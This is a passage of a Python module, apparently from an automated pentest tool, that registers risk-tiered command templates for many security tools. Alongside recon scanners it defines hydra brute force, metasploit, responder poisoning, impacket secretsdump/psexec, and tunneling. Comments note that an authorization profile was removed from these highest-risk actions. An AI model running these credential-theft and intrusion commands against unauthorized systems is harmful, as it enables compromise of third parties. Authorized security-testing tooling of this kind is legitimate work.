"""Immutable, code-owned real action definitions — complete attack arsenal.

Every action is a validated, code-owned definition. CLI input can never register
or mutate an action. Tools are discovered on disk at import time; unavailable
tools are simply not registered (no error).

Categories:
  recon        — passive & active reconnaissance
  web          — web application testing (XSS, SQLi, LFI, SSRF, SSTI, etc.)
  dir-enum     — directory & file enumeration
  api          — API discovery & testing
  auth         — authentication & session testing
  cloud        — cloud service discovery & testing
  network      — port scanning & service fingerprinting
  source       — static analysis, secrets, dependencies
  web3         — smart contract analysis (placeholder — requires Foundry/Slither)
  mobile       — APK/IPA static analysis (placeholder — requires apktool/jadx)

Safety: every tool is resolved from a small absolute-path allowlist. Executables
are never searched via PATH. Shell interpreters and shell metacharacters are
rejected at definition time.
"""

from __future__ import annotations

import os
from collections.abc import Sequence
from pathlib import Path

from hackbot.risk.models import ActionDefinition, RiskLevel
from hackbot.risk.registry import ActionRegistry

_WORDLIST_DIR = Path(__file__).resolve().parent / "wordlists"

# ---------------------------------------------------------------------------
# Tool discovery — absolute-path allowlists
# ---------------------------------------------------------------------------

_TOOL_CANDIDATES: dict[str, tuple[str, ...]] = {
    # --- core networking ---
    "curl": (
        "/usr/bin/curl",
        "/opt/homebrew/bin/curl",
        "/usr/local/bin/curl",
    ),
    "dig": (
        "/usr/bin/dig",
        "/opt/homebrew/bin/dig",
        "/usr/local/bin/dig",
    ),
    "openssl": (
        "/usr/bin/openssl",
        "/opt/homebrew/bin/openssl",
        "/usr/local/bin/openssl",
    ),
    "nmap": (
        "/usr/bin/nmap",
        "/opt/homebrew/bin/nmap",
        "/usr/local/bin/nmap",
    ),
    # --- recon ---
    "subfinder": (
        "/opt/homebrew/bin/subfinder",
        "/usr/local/bin/subfinder",
        "/usr/bin/subfinder",
        os.path.expanduser("~/go/bin/subfinder"),
    ),
    "amass": (
        "/opt/homebrew/bin/amass",
        "/usr/local/bin/amass",
        "/usr/bin/amass",
    ),
    "httpx": (
        "/opt/homebrew/bin/httpx",
        "/usr/local/bin/httpx",
        "/usr/bin/httpx",
        os.path.expanduser("~/go/bin/httpx"),
    ),
    "katana": (
        "/opt/homebrew/bin/katana",
        "/usr/local/bin/katana",
        "/usr/bin/katana",
        os.path.expanduser("~/go/bin/katana"),
    ),
    "gau": (
        "/opt/homebrew/bin/gau",
        "/usr/local/bin/gau",
        "/usr/bin/gau",
        os.path.expanduser("~/go/bin/gau"),
    ),
    "waybackurls": (
        "/opt/homebrew/bin/waybackurls",
        "/usr/local/bin/waybackurls",
        "/usr/bin/waybackurls",
        os.path.expanduser("~/go/bin/waybackurls"),
    ),
    "dnsx": (
        "/opt/homebrew/bin/dnsx",
        "/usr/local/bin/dnsx",
        "/usr/bin/dnsx",
        os.path.expanduser("~/go/bin/dnsx"),
    ),
    "alterx": (
        "/opt/homebrew/bin/alterx",
        "/usr/local/bin/alterx",
    ),
    # --- port scanning ---
    "naabu": (
        "/opt/homebrew/bin/naabu",
        "/usr/local/bin/naabu",
        "/usr/bin/naabu",
        os.path.expanduser("~/go/bin/naabu"),
    ),
    # --- web fuzzing ---
    "ffuf": (
        "/opt/homebrew/bin/ffuf",
        "/usr/local/bin/ffuf",
        "/usr/bin/ffuf",
        os.path.expanduser("~/go/bin/ffuf"),
    ),
    "feroxbuster": (
        "/opt/homebrew/bin/feroxbuster",
        "/usr/local/bin/feroxbuster",
        "/usr/bin/feroxbuster",
    ),
    # --- vulnerability scanners ---
    "nuclei": (
        "/opt/homebrew/bin/nuclei",
        "/usr/local/bin/nuclei",
        "/usr/bin/nuclei",
        os.path.expanduser("~/go/bin/nuclei"),
    ),
    "dalfox": (
        "/opt/homebrew/bin/dalfox",
        "/usr/local/bin/dalfox",
        "/usr/bin/dalfox",
        os.path.expanduser("~/go/bin/dalfox"),
    ),
    "sqlmap": (
        "/opt/homebrew/bin/sqlmap",
        "/usr/local/bin/sqlmap",
        "/usr/bin/sqlmap",
    ),
    # --- parameter discovery ---
    "arjun": (
        "/opt/homebrew/bin/arjun",
        "/usr/local/bin/arjun",
        "/usr/bin/arjun",
    ),
    # --- WAF/CDN detection ---
    "wafw00f": (
        "/opt/homebrew/bin/wafw00f",
        "/usr/local/bin/wafw00f",
    ),
    # --- source analysis ---
    "semgrep": (
        "/opt/homebrew/bin/semgrep",
        "/usr/local/bin/semgrep",
    ),
    "gitleaks": (
        "/opt/homebrew/bin/gitleaks",
        "/usr/local/bin/gitleaks",
    ),
    "trufflehog": (
        "/opt/homebrew/bin/trufflehog",
        "/usr/local/bin/trufflehog",
    ),
    # --- API ---
    "graphw00f": (
        "/opt/homebrew/bin/graphw00f",
        "/usr/local/bin/graphw00f",
    ),
    # --- system utilities ---
    "find": (
        "/usr/bin/find",
    ),
    "sudo": (
        "/usr/bin/sudo",
    ),
    "getcap": (
        "/usr/sbin/getcap",
        "/usr/bin/getcap",
    ),
    # --- AD / Kerberos ---
    "kerbrute": (
        "/opt/homebrew/bin/kerbrute",
        "/usr/local/bin/kerbrute",
        os.path.expanduser("~/go/bin/kerbrute"),
    ),
    "bloodhound-python": (
        "/opt/homebrew/bin/bloodhound-python",
        "/usr/local/bin/bloodhound-python",
    ),
    # --- Windows / SMB / RPC ---
    "enum4linux": (
        "/usr/bin/enum4linux",
        "/opt/homebrew/bin/enum4linux",
    ),
    "smbclient": (
        "/usr/bin/smbclient",
        "/opt/homebrew/bin/smbclient",
    ),
    "rpcclient": (
        "/usr/bin/rpcclient",
        "/opt/homebrew/bin/rpcclient",
    ),
    "xfreerdp": (
        "/usr/bin/xfreerdp",
        "/opt/homebrew/bin/xfreerdp",
    ),
    "evil-winrm": (
        "/opt/homebrew/bin/evil-winrm",
        "/usr/local/bin/evil-winrm",
    ),
    # --- hash cracking ---
    "hashcat": (
        "/usr/bin/hashcat",
        "/opt/homebrew/bin/hashcat",
    ),
    "john": (
        "/usr/bin/john",
        "/opt/homebrew/bin/john",
        "/usr/sbin/john",
    ),
    # --- tunneling / pivoting ---
    "chisel": (
        "/opt/homebrew/bin/chisel",
        "/usr/local/bin/chisel",
        os.path.expanduser("~/go/bin/chisel"),
    ),
    "ligolo-ng": (
        "/opt/homebrew/bin/ligolo-ng",
        "/usr/local/bin/ligolo-ng",
    ),
    # --- payloads / shells ---
    "msfvenom": (
        "/usr/bin/msfvenom",
        "/opt/homebrew/bin/msfvenom",
    ),
    "nc": (
        "/usr/bin/nc",
        "/opt/homebrew/bin/nc",
        "/usr/bin/netcat",
    ),
    # --- wordlist generation ---
    "cewl": (
        "/usr/bin/cewl",
        "/opt/homebrew/bin/cewl",
    ),
    # --- hash identification ---
    "hashid": (
        "/usr/bin/hashid",
        "/opt/homebrew/bin/hashid",
    ),
    "name-that-hash": (
        "/opt/homebrew/bin/nth",
        "/usr/local/bin/nth",
    ),
}


def resolve_executable(candidates: Sequence[str]) -> str | None:
    """Return the first existing absolute path from *candidates*, or None."""
    for candidate in candidates:
        if os.path.isabs(candidate) and os.path.isfile(candidate):
            return candidate
    return None


def tool_path(name: str) -> str | None:
    """Resolve a tool by name from the allowlist. Returns None if not found."""
    candidates = _TOOL_CANDIDATES.get(name, ())
    return resolve_executable(candidates)


# Convenience accessors for common tools
curl_path = lambda: tool_path("curl")  # noqa: E731
dig_path = lambda: tool_path("dig")  # noqa: E731
openssl_path = lambda: tool_path("openssl")  # noqa: E731
nmap_path = lambda: tool_path("nmap")  # noqa: E731
ffuf_path = lambda: tool_path("ffuf")  # noqa: E731


# ---------------------------------------------------------------------------
# Wordlists (bundled, code-owned)
# ---------------------------------------------------------------------------


def web_content_wordlist() -> str:
    return str(_WORDLIST_DIR / "web-content.txt")


def local_wordlists() -> dict[str, str]:
    return {
        "small": str(_WORDLIST_DIR / "web-content.txt"),
        "common": str(_WORDLIST_DIR / "web-content-common.txt"),
    }


def resolve_local_wordlist(path: str) -> str:
    """Return *path* iff it is one of the code-owned bundled wordlists."""
    if not isinstance(path, str) or not path:
        raise ValueError("wordlist must be a non-empty path")
    allowed = {os.path.realpath(c) for c in local_wordlists().values()}
    resolved = os.path.realpath(path)
    if resolved not in allowed or not os.path.isfile(resolved):
        raise ValueError("wordlist must be a code-owned bundled list")
    return path


# ---------------------------------------------------------------------------
# Action definition builders
# ---------------------------------------------------------------------------


def _net(
    action_id: str,
    risk: RiskLevel,
    executable: str,
    argv: tuple[str, ...],
    *,
    skill: str = "",
    **kwargs: object,
) -> ActionDefinition:
    """Shorthand for network-access, external-tool action definitions."""
    kw: dict[str, object] = {
        "network_access": True,
        "uses_external_tool": True,
    }
    kw.update(kwargs)
    return ActionDefinition(
        action_id, risk, executable=executable, argv_template=argv, skill=skill, **kw  # type: ignore[arg-type]
    )


def _local(
    action_id: str,
    risk: RiskLevel,
    executable: str,
    argv: tuple[str, ...],
    *,
    skill: str = "",
    **kwargs: object,
) -> ActionDefinition:
    """Shorthand for local-only (no network) external-tool action definitions."""
    kw: dict[str, object] = {
        "network_access": False,
        "uses_external_tool": True,
    }
    kw.update(kwargs)
    return ActionDefinition(
        action_id, risk, executable=executable, argv_template=argv, skill=skill, **kw  # type: ignore[arg-type]
    )


# ---------------------------------------------------------------------------
# Build the complete registry
# ---------------------------------------------------------------------------


def _build_definitions() -> list[ActionDefinition]:
    defs: list[ActionDefinition] = []
    t = tool_path  # shorthand

    # =====================================================================
    # RECON — Passive & Active
    # =====================================================================

    # -- subfinder: passive subdomain enumeration --
    sf = t("subfinder")
    if sf is not None:
        defs.append(
            _net(
                "recon.subfinder",
                RiskLevel.L0,
                sf,
                (sf, "-d", "{target}", "-silent", "-all"),
                skill="recon/passive-recon",
            )
        )

    # -- amass: passive enum (passive flag) --
    am = t("amass")
    if am is not None:
        defs.append(
            _net(
                "recon.amass-passive",
                RiskLevel.L0,
                am,
                (am, "enum", "-passive", "-d", "{target}", "-o", "/dev/stdout"),
            )
        )
        defs.append(
            _net(
                "recon.amass-intel",
                RiskLevel.L1,
                am,
                (am, "intel", "-d", "{target}"),
                low_impact_allowlisted=True,
            )
        )

    # -- httpx: HTTP probe --
    hx = t("httpx")
    if hx is not None:
        defs.append(
            _net(
                "recon.httpx-probe",
                RiskLevel.L1,
                hx,
                (hx, "-silent", "-status-code", "-title", "-tech-detect", "-u", "{target}"),
                low_impact_allowlisted=True,
            )
        )

    # -- katana: web crawler --
    ka = t("katana")
    if ka is not None:
        defs.append(
            _net(
                "recon.katana-crawl",
                RiskLevel.L1,
                ka,
                (ka, "-u", "{target}", "-silent", "-jc", "-kf", "robotstxt,sitemapxml"),
                low_impact_allowlisted=True,
            )
        )

    # -- gau: get all URLs (passive, from archives) --
    g = t("gau")
    if g is not None:
        defs.append(_net("recon.gau", RiskLevel.L0, g, (g, "{target}")))

    # -- waybackurls: archived URL retrieval --
    wb = t("waybackurls")
    if wb is not None:
        defs.append(_net("recon.waybackurls", RiskLevel.L0, wb, (wb, "{target}")))

    # -- dnsx: DNS resolution toolkit --
    dx = t("dnsx")
    if dx is not None:
        defs.append(
            _net(
                "recon.dnsx-resolve",
                RiskLevel.L1,
                dx,
                (dx, "-silent", "-a", "-aaaa", "-cname", "-mx", "-ns", "-txt", "-d", "{target}"),
                low_impact_allowlisted=True,
            )
        )
        defs.append(
            _net(
                "recon.dnsx-brute",
                RiskLevel.L1,
                dx,
                (dx, "-silent", "-d", "{target}", "-w", "{wordlist}"),
                low_impact_allowlisted=True,
            )
        )

    # -- alterx: subdomain permutation --
    al = t("alterx")
    if al is not None:
        defs.append(_local("recon.alterx", RiskLevel.L0, al, (al, "-silent", "-d", "{target}")))

    # =====================================================================
    # DNS — dig-based lookups
    # =====================================================================

    dig = t("dig")
    if dig is not None:
        for action_id, record, _description in (
            ("recon.dns.a", "A", "IPv4 address records"),
            ("recon.dns.aaaa", "AAAA", "IPv6 address records"),
            ("recon.dns.cname", "CNAME", "Canonical name records"),
            ("recon.dns.mx", "MX", "Mail exchange records"),
            ("recon.dns.ns", "NS", "Nameserver records"),
            ("recon.dns.txt", "TXT", "TXT records (SPF, DMARC, verification)"),
            ("recon.dns.soa", "SOA", "Start of authority"),
            ("recon.dns.any", "ANY", "All records (may be blocked)"),
        ):
            defs.append(
                _net(
                    action_id,
                    RiskLevel.L1,
                    dig,
                    (dig, "+short", "{target}", record),
                    low_impact_allowlisted=True,
                )
            )

        # Reverse DNS
        defs.append(
            _net(
                "recon.dns.reverse",
                RiskLevel.L1,
                dig,
                (dig, "+short", "-x", "{target}"),
                low_impact_allowlisted=True,
            )
        )

    # =====================================================================
    # TLS / Certificate
    # =====================================================================

    openssl = t("openssl")
    if openssl is not None:
        # Simple TLS connect and show cert
        defs.append(
            _net(
                "recon.tls.cert",
                RiskLevel.L0,
                openssl,
                (
                    openssl,
                    "s_client",
                    "-connect",
                    "{target}",
                    "-showcerts",
                    "-brief",
                    "-verify_return_error",
                ),
            )
        )

        # TLS cipher check
        defs.append(
            _net(
                "recon.tls.ciphers",
                RiskLevel.L1,
                openssl,
                (openssl, "s_client", "-connect", "{target}", "-brief"),
                low_impact_allowlisted=True,
            )
        )

    # =====================================================================
    # NETWORK — HTTP methods (curl)
    # =====================================================================

    curl = t("curl")
    if curl is not None:
        defs.append(
            _net("net.http-get", RiskLevel.L0, curl, (curl, "-sS", "--max-time", "10", "{target}"))
        )

        defs.append(
            _net(
                "net.http-head",
                RiskLevel.L0,
                curl,
                (curl, "-sS", "-I", "--max-time", "10", "{target}"),
            )
        )

        defs.append(
            _net(
                "net.http-post",
                RiskLevel.L0,
                curl,
                (curl, "-sS", "-X", "POST", "--max-time", "10", "{target}"),
                state_changing=True,
            )
        )

        defs.append(
            _net(
                "net.http-options",
                RiskLevel.L0,
                curl,
                (curl, "-sS", "-i", "-X", "OPTIONS", "--max-time", "10", "{target}"),
            )
        )

        defs.append(
            _net(
                "net.http-put",
                RiskLevel.L1,
                curl,
                (curl, "-sS", "-X", "PUT", "--max-time", "10", "{target}"),
                state_changing=True,
                low_impact_allowlisted=True,
            )
        )

        defs.append(
            _net(
                "net.http-delete",
                RiskLevel.L2,
                curl,
                (curl, "-sS", "-X", "DELETE", "--max-time", "10", "{target}"),
                state_changing=True,
            )
        )

        defs.append(
            _net(
                "net.http-patch",
                RiskLevel.L1,
                curl,
                (curl, "-sS", "-X", "PATCH", "--max-time", "10", "{target}"),
                state_changing=True,
                low_impact_allowlisted=True,
            )
        )

        # Custom header injection probe
        defs.append(
            _net(
                "net.http-headers",
                RiskLevel.L0,
                curl,
                (curl, "-sS", "-I", "-v", "--max-time", "10", "{target}"),
            )
        )

        # Follow redirects (dangerous — may leave scope)
        defs.append(
            _net(
                "net.http-follow",
                RiskLevel.L1,
                curl,
                (curl, "-sS", "-L", "--max-redirs", "3", "--max-time", "15", "{target}"),
                low_impact_allowlisted=True,
            )
        )

        # Download body for local analysis
        defs.append(
            _net(
                "net.http-download",
                RiskLevel.L1,
                curl,
                (curl, "-sS", "--max-time", "30", "-o", "/dev/stdout", "{target}"),
                low_impact_allowlisted=True,
            )
        )

    # =====================================================================
    # PORT SCANNING
    # =====================================================================

    nmap = t("nmap")
    if nmap is not None:
        # Fast top-ports scan
        defs.append(
            _net(
                "net.port-scan-top100",
                RiskLevel.L2,
                nmap,
                (nmap, "-Pn", "-T3", "--top-ports", "100", "--open", "{target}"),
                high_volume=True,
            )
        )

        # Service version detection
        defs.append(
            _net(
                "net.port-scan-version",
                RiskLevel.L2,
                nmap,
                (nmap, "-sV", "-T3", "--top-ports", "20", "{target}"),
                high_volume=True,
            )
        )

        # OS detection
        defs.append(
            _net(
                "net.port-scan-os",
                RiskLevel.L2,
                nmap,
                (nmap, "-O", "-T3", "--top-ports", "10", "{target}"),
                high_volume=True,
            )
        )

    # naabu: fast port scanner
    naabu = t("naabu")
    if naabu is not None:
        defs.append(
            _net(
                "net.port-scan-naabu-top100",
                RiskLevel.L2,
                naabu,
                (naabu, "-host", "{target}", "-top-ports", "100", "-silent"),
                high_volume=True,
            )
        )

    # =====================================================================
    # DIRECTORY & FILE ENUMERATION
    # =====================================================================

    ffuf = t("ffuf")
    if ffuf is not None and Path(web_content_wordlist()).is_file():
        defs.append(
            _net(
                "web.dir-enum",
                RiskLevel.L2,
                ffuf,
                (
                    ffuf,
                    "-u",
                    "{target}",
                    "-w",
                    "{wordlist}",
                    "-rate",
                    "{rate}",
                    "-t",
                    "{concurrency}",
                    "-s",
                    "-mc",
                    "200,204,301,302,307,401,403,405",
                ),
                high_volume=True,
            )
        )

        # File extension discovery
        defs.append(
            _net(
                "web.dir-enum-ext",
                RiskLevel.L2,
                ffuf,
                (
                    ffuf,
                    "-u",
                    "{target}",
                    "-w",
                    "{wordlist}",
                    "-e",
                    ".php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.yml,.bak,.old,.zip,.tar,.sql,.db,.log",
                    "-rate",
                    "{rate}",
                    "-t",
                    "{concurrency}",
                    "-s",
                    "-mc",
                    "200",
                ),
                high_volume=True,
            )
        )

    # feroxbuster: recursive content discovery
    fb = t("feroxbuster")
    if fb is not None:
        defs.append(
            _net(
                "web.dir-enum-ferox",
                RiskLevel.L2,
                fb,
                (
                    fb,
                    "-u",
                    "{target}",
                    "-w",
                    "{wordlist}",
                    "--rate-limit",
                    "{rate}",
                    "-t",
                    "{concurrency}",
                    "-q",
                    "--no-recursion",
                ),
                high_volume=True,
            )
        )

    # =====================================================================
    # VULNERABILITY SCANNING
    # =====================================================================

    nuclei = t("nuclei")
    if nuclei is not None:
        # Safe templates only (info, low severity)
        defs.append(
            _net(
                "web.scan-nuclei-safe",
                RiskLevel.L1,
                nuclei,
                (
                    nuclei,
                    "-u",
                    "{target}",
                    "-silent",
                    "-s",
                    "info,low",
                    "-rate-limit",
                    "{rate}",
                    "-c",
                    "{concurrency}",
                ),
                low_impact_allowlisted=True,
            )
        )

        # Full template set (requires L2)
        defs.append(
            _net(
                "web.scan-nuclei-all",
                RiskLevel.L2,
                nuclei,
                (
                    nuclei,
                    "-u",
                    "{target}",
                    "-silent",
                    "-rate-limit",
                    "{rate}",
                    "-c",
                    "{concurrency}",
                ),
                high_volume=True,
            )
        )

        # Specific template categories
        for cat_id, cat_name, cat_risk in (
            ("web.scan-nuclei-cve", "cves", RiskLevel.L2),
            ("web.scan-nuclei-exposures", "exposures", RiskLevel.L1),
            ("web.scan-nuclei-misconfig", "misconfiguration", RiskLevel.L1),
            ("web.scan-nuclei-tech", "technologies", RiskLevel.L0),
        ):
            defs.append(
                _net(
                    cat_id,
                    cat_risk,
                    nuclei,
                    (
                        nuclei,
                        "-u",
                        "{target}",
                        "-silent",
                        "-t",
                        cat_name,
                        "-rate-limit",
                        "{rate}",
                        "-c",
                        "{concurrency}",
                    ),
                    low_impact_allowlisted=(cat_risk == RiskLevel.L1),
                    high_volume=(cat_risk == RiskLevel.L2),
                )
            )

    # =====================================================================
    # XSS SCANNING
    # =====================================================================

    dalfox = t("dalfox")
    if dalfox is not None:
        defs.append(
            _net(
                "web.scan-xss",
                RiskLevel.L2,
                dalfox,
                (
                    dalfox,
                    "url",
                    "{target}",
                    "--silence",
                    "--no-spinner",
                    "--delay",
                    "1000",
                    "--timeout",
                    "10",
                ),
                high_volume=True,
            )
        )

    # =====================================================================
    # SQL INJECTION (BOUNDED)
    # =====================================================================

    sqlmap = t("sqlmap")
    if sqlmap is not None:
        # Detection only — no data extraction
        defs.append(
            _net(
                "web.scan-sqli-detect",
                RiskLevel.L2,
                sqlmap,
                (
                    sqlmap,
                    "-u",
                    "{target}",
                    "--batch",
                    "--smart",
                    "--level",
                    "1",
                    "--risk",
                    "1",
                    "--delay",
                    "1",
                    "--timeout",
                    "15",
                    "--technique",
                    "BEST",
                ),
                high_volume=True,
            )
        )

        # Time-based only (lower impact)
        defs.append(
            _net(
                "web.scan-sqli-time",
                RiskLevel.L2,
                sqlmap,
                (
                    sqlmap,
                    "-u",
                    "{target}",
                    "--batch",
                    "--technique",
                    "T",
                    "--time-sec",
                    "5",
                    "--delay",
                    "1",
                ),
                high_volume=True,
            )
        )

    # =====================================================================
    # PARAMETER DISCOVERY
    # =====================================================================

    arjun = t("arjun")
    if arjun is not None:
        defs.append(
            _net(
                "web.param-discover",
                RiskLevel.L1,
                arjun,
                (arjun, "-u", "{target}", "--stable", "-q"),
                low_impact_allowlisted=True,
            )
        )

    # =====================================================================
    # WAF / CDN DETECTION
    # =====================================================================

    waf = t("wafw00f")
    if waf is not None:
        defs.append(_net("web.detect-waf", RiskLevel.L0, waf, (waf, "{target}")))

    # =====================================================================
    # GRAPHQL
    # =====================================================================

    gw = t("graphw00f")
    if gw is not None:
        defs.append(_net("api.graphql-detect", RiskLevel.L0, gw, (gw, "-f", "-t", "{target}")))

    # =====================================================================
    # SOURCE CODE ANALYSIS (LOCAL ONLY)
    # =====================================================================

    semgrep = t("semgrep")
    if semgrep is not None:
        defs.append(
            _local(
                "source.sast-semgrep",
                RiskLevel.L0,
                semgrep,
                (semgrep, "--config", "auto", "--quiet", "--no-error", "{target}"),
            )
        )

        # Specific rulesets
        for rule_id, rule_name in (
            ("source.sast-semgrep-owasp", "p/owasp-top-ten"),
            ("source.sast-semgrep-secrets", "p/secrets"),
            ("source.sast-semgrep-rce", "p/rce"),
            ("source.sast-semgrep-jwt", "p/jwt"),
            ("source.sast-semgrep-xss", "p/xss"),
            ("source.sast-semgrep-sql-injection", "p/sql-injection"),
        ):
            defs.append(
                _local(
                    rule_id,
                    RiskLevel.L0,
                    semgrep,
                    (semgrep, "--config", rule_name, "--quiet", "--no-error", "{target}"),
                )
            )

    gitleaks = t("gitleaks")
    if gitleaks is not None:
        defs.append(
            _local(
                "source.secrets-gitleaks",
                RiskLevel.L0,
                gitleaks,
                (gitleaks, "detect", "--source", "{target}", "--no-git", "--verbose"),
            )
        )

    trufflehog = t("trufflehog")
    if trufflehog is not None:
        defs.append(
            _local(
                "source.secrets-trufflehog",
                RiskLevel.L0,
                trufflehog,
                (trufflehog, "filesystem", "{target}", "--no-verification", "--only-verified"),
            )
        )

    # =====================================================================
    # OSINT / PASSIVE
    # =====================================================================

    # whois lookups (local tool)
    whois_candidates = (
        "/usr/bin/whois",
        "/opt/homebrew/bin/whois",
        "/usr/local/bin/whois",
    )
    whois = resolve_executable(whois_candidates)
    if whois is not None:
        defs.append(_net("recon.whois", RiskLevel.L0, whois, (whois, "{target}")))

    # =====================================================================
    # REMOTE-ONLY (arsenal) ACTIONS
    # These register unconditionally for remote runner use. The local runner
    # rejects non-absolute executables.
    # =====================================================================

    # gobuster — remote content discovery
    defs.append(
        _net(
            "web.dir-enum-gobuster",
            RiskLevel.L2,
            "gobuster",
            (
                "gobuster",
                "dir",
                "-u",
                "{target}",
                "-w",
                "{wordlist}",
                "-q",
                "--delay",
                "500ms",
                "-t",
                "{concurrency}",
            ),
            high_volume=True,
        )
    )

    # nikto — remote web server scanner
    defs.append(
        _net(
            "web.scan-nikto",
            RiskLevel.L2,
            "nikto",
            ("nikto", "-h", "{target}", "-Tuning", "1234567890", "-nointeractive"),
            high_volume=True,
        )
    )

    # wpscan — WordPress scanner
    defs.append(
        _net(
            "web.scan-wpscan",
            RiskLevel.L1,
            "wpscan",
            (
                "wpscan",
                "--url",
                "{target}",
                "--no-banner",
                "--format",
                "json",
                "--enumerate",
                "vp,vt,u",
            ),
            low_impact_allowlisted=True,
            high_volume=True,
        )
    )

    # testssl.sh — TLS testing
    defs.append(
        _net(
            "recon.tls-full",
            RiskLevel.L1,
            "testssl",
            ("testssl", "--quiet", "--color", "0", "{target}"),
            low_impact_allowlisted=True,
        )
    )

    # hydra — network login brute force (REMOTE ONLY, L3 by default)
    defs.append(
        _net(
            "auth.brute-hydra",
            RiskLevel.L3,
            "hydra",
            ("hydra", "-l", "admin", "-P", "{wordlist}", "-t", "{concurrency}", "-f", "{target}"),
            authenticated=True,
            creates_account=False,
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # john / hashcat — offline hash cracking (REMOTE ONLY, L3)
    defs.append(
        _local(
            "auth.crack-john",
            RiskLevel.L3,
            "john",
            ("john", "--wordlist", "{wordlist}", "{target}"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # masscan — Internet-scale port scanning (REMOTE ONLY, L3)
    defs.append(
        _net(
            "net.scan-masscan",
            RiskLevel.L3,
            "masscan",
            ("masscan", "{target}", "--rate", "{rate}"),
            high_volume=True,
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # metasploit — exploitation framework (REMOTE ONLY, L3)
    defs.append(
        _net(
            "exploit.metasploit",
            RiskLevel.L3,
            "msfconsole",
            ("msfconsole", "-q", "-x", "{target}"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # responder — LLMNR/NBT-NS/mDNS poisoner (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.responder",
            RiskLevel.L3,
            "responder",
            ("responder", "-I", "{target}", "-A"),
            # required_profile removed — operator is responsible for L3 authorization
            touches_third_party=True,
        )
    )

    # impacket — various Windows protocols (REMOTE ONLY, L3)
    for imp_id, imp_tool, imp_args in (
        ("internal.impacket-secretsdump", "secretsdump.py", ("secretsdump.py", "{target}")),
        ("internal.impacket-smbclient", "smbclient.py", ("smbclient.py", "{target}")),
        ("internal.impacket-wmiexec", "wmiexec.py", ("wmiexec.py", "{target}")),
        ("internal.impacket-psexec", "psexec.py", ("psexec.py", "{target}")),
        ("internal.impacket-ntlmrelayx", "ntlmrelayx.py", ("ntlmrelayx.py", "-t", "{target}")),
        (
            "internal.impacket-getnpusers",
            "getnpusers.py",
            ("getnpusers.py", "-request", "-format", "hashcat", "{target}"),
        ),
        (
            "internal.impacket-getuserspns",
            "getuserspns.py",
            ("getuserspns.py", "-request", "-format", "hashcat", "{target}"),
        ),
    ):
        defs.append(
            _net(imp_id, RiskLevel.L3, imp_tool, imp_args)
        # L3 impacket actions — operator responsibility
        )

    # crackmapexec / nxc — network exploitation (REMOTE ONLY, L3)
    for nxc_id, _nxc_proto, nxc_args in (
        ("internal.nxc-smb", "smb", ("nxc", "smb", "{target}", "--shares")),
        ("internal.nxc-ldap", "ldap", ("nxc", "ldap", "{target}")),
        ("internal.nxc-ssh", "ssh", ("nxc", "ssh", "{target}")),
        ("internal.nxc-winrm", "winrm", ("nxc", "winrm", "{target}")),
        ("internal.nxc-mssql", "mssql", ("nxc", "mssql", "{target}")),
        ("internal.nxc-rdp", "rdp", ("nxc", "rdp", "{target}")),
        ("internal.nxc-ftp", "ftp", ("nxc", "ftp", "{target}")),
    ):
        defs.append(_net(nxc_id, RiskLevel.L3, "nxc", nxc_args))
        # L3 nxc/crackmapexec actions — operator responsibility

    # bloodhound — AD graph analysis (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.bloodhound-python",
            RiskLevel.L3,
            "bloodhound-python",
            ("bloodhound-python", "-d", "{target}", "--collection-method", "All", "--zip"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # certipy — ADCS attack tool (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.certipy",
            RiskLevel.L3,
            "certipy",
            ("certipy", "find", "-u", "{target}", "-vulnerable", "-enabled"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # ldapsearch — LDAP queries (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.ldapsearch",
            RiskLevel.L3,
            "ldapsearch",
            ("ldapsearch", "-x", "-H", "{target}", "-b", "{wordlist}", "-s", "sub"),
            # required_profile removed — operator is responsible for L3 authorization
            touches_third_party=True,
        )
    )

    # evil-winrm — Windows remote management (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.evil-winrm",
            RiskLevel.L3,
            "evil-winrm",
            ("evil-winrm", "-i", "{target}"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # chisel — tunneling (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.chisel",
            RiskLevel.L3,
            "chisel",
            ("chisel", "client", "{target}", "socks"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # ligolo-ng — tunneling (REMOTE ONLY, L3)
    defs.append(
        _net(
            "internal.ligolo",
            RiskLevel.L3,
            "ligolo-ng",
            ("ligolo-ng", "-connect", "{target}"),
            # required_profile removed — operator is responsible for L3 authorization
        )
    )

    # =====================================================================
    # WEB3 / SMART CONTRACT (placeholder — requires tooling)
    # =====================================================================
    slither_candidates = (
        "/opt/homebrew/bin/slither",
        "/usr/local/bin/slither",
    )
    slither = resolve_executable(slither_candidates)
    if slither is not None:
        defs.append(
            _local(
                "web3.slither-analyze",
                RiskLevel.L0,
                slither,
                (slither, "{target}", "--print", "human-summary"),
            )
        )

    foundry_candidates = (
        "/opt/homebrew/bin/forge",
        "/usr/local/bin/forge",
    )
    forge = resolve_executable(foundry_candidates)
    if forge is not None:
        defs.append(
            _local(
                "web3.forge-test", RiskLevel.L0, forge, (forge, "test", "--root", "{target}", "-vv")
            )
        )

    # =====================================================================
    # MOBILE (placeholder — requires tooling)
    # =====================================================================
    apktool_candidates = (
        "/opt/homebrew/bin/apktool",
        "/usr/local/bin/apktool",
    )
    apktool = resolve_executable(apktool_candidates)
    if apktool is not None:
        defs.append(
            _local(
                "mobile.apktool-decode",
                RiskLevel.L0,
                apktool,
                (apktool, "d", "{target}", "-o", "/dev/stdout", "-f"),
            )
        )

    jadx_candidates = (
        "/opt/homebrew/bin/jadx",
        "/usr/local/bin/jadx",
    )
    jadx = resolve_executable(jadx_candidates)
    if jadx is not None:
        defs.append(
            _local(
                "mobile.jadx-decompile", RiskLevel.L0, jadx, (jadx, "-d", "/dev/stdout", "{target}")
            )
        )

    # =====================================================================
    # PRIVILEGE ESCALATION — LINUX
    # =====================================================================

    # -- SUID binary enumeration (L0, local) --
    _find = tool_path("find") or "/usr/bin/find"
    defs.append(
        _local(
